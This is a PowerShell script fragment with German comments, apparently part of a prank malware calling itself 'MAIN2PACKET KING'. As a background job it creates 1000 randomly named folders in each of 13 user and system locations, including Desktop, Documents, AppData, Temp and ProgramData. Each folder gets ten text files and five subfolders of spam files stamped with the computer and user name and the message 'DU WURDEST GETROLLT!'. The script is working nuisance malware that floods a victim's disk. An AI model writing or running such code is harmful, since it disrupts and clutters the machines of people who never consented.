$ordnerJob = Start-Job -ScriptBlock {
    # ALLE ZIELE F├£R ORDNER
    $alleZiele = @(
        [Environment]::GetFolderPath("Desktop"),
        [Environment]::GetFolderPath("MyDocuments"),
        [Environment]::GetFolderPath("UserProfiles") + "\Downloads",
        [Environment]::GetFolderPath("MyMusic"),
        [Environment]::GetFolderPath("MyPictures"),
        [Environment]::GetFolderPath("MyVideos"),
        $env:APPDATA,
        $env:LOCALAPPDATA,
        $env:TEMP,
        "C:\ProgramData",
        "C:\Users\Public\Desktop",
        "C:\Users\Public\Documents",
        "C:\Users\Public\Downloads"
    )
    
    $ordnerBasen = @(
        "MAIN2PACKET", "KING", "TURBO", "ULTRA", "MEGA", "GIGA",
        "SYSTEM", "CORE", "BACKUP", "CACHE", "TEMP", "DATA",
        "VIRUS", "TROJAN", "RANSOMWARE", "MINECRAFT", "DISCORD",
        "SPOTIFY", "STEAM", "CHROME", "FIREFOX", "WINDOWS"
    )
    
    $zielCount = 0
    foreach ($ziel in $alleZiele) {
        $zielCount++
        if (Test-Path $ziel) {
            # 1000 ORDNER PRO ZIEL!
            for ($o = 1; $o -le 1000; $o++) {
                $baseName = Get-Random $ordnerBasen
                $ordnerName = $baseName + "_" + $zielCount + "_" + $o
                $ordnerPfad = Join-Path $ziel $ordnerName
                try {
                    New-Item -Path $ordnerPfad -ItemType Directory -Force | Out-Null
                    
                    # 10 TEXT-DATEIEN PRO ORDNER (TEXT SPAM!)
                    for ($d = 1; $d -le 10; $d++) {
                        $dateiName = "MAIN2PACKET_DATEI_$d.txt"
                        $dateiPfad = Join-Path $ordnerPfad $dateiName
                        
                        # Zuf├ñlliger Text-Inhalt
                        $textInhalt = @"
MAIN2PACKET KING - ORDNER $o, DATEI $d
======================================
DIES IST EINE TEXT-SPAM DATEI!
Computer: $env:COMPUTERNAME
Benutzer: $env:USERNAME
Datum: $(Get-Date)

≡ÓõÑ DU WURDEST GETROLLT! ≡ÓõÑ
≡Óôü ORDNER SPAM AKTIV!
≡Óôã TEXT SPAM AKTIV!
≡ÓÈ¼ POPUP SPAM AKTIV!

MAIN2PACKET IST ├£BERALL!
"@
                        $textInhalt | Out-File $dateiPfad -Encoding UTF8 -Force
                    }
                    
                    # 5 UNTERORDNER PRO ORDNER (EXTRA SPAM!)
                    for ($u = 1; $u -le 5; $u++) {
                        $unterName = "SUB_" + $u + "_" + (Get-Random -Minimum 100 -Maximum 999)
                        $unterPfad = Join-Path $ordnerPfad $unterName
                        New-Item -Path $unterPfad -ItemType Directory -Force | Out-Null
                        
                        # 5 DATEIEN PRO UNTERORDNER
                        for ($ud = 1; $ud -le 5; $ud++) {
                            $unterDatei = Join-Path $unterPfad "subfile_$ud.txt"
                            "SUB-ORDNER $u - DATEI $ud - MAIN2PACKET" | Out-File $unterDatei -Encoding UTF8 -Force
                        }
                    }
                } catch {}
            }
        }
    }
}

